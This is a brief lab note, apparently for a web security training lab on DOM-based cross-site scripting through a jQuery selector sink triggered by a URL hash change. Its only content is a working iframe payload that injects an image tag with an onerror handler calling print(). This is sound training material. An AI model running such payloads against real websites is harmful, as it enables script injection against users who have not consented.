# Lab 6 — DOM XSS jQuery Selector Hashchange (APPRENTICE)

## Payload (deliver via iframe)
```html
<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">
```
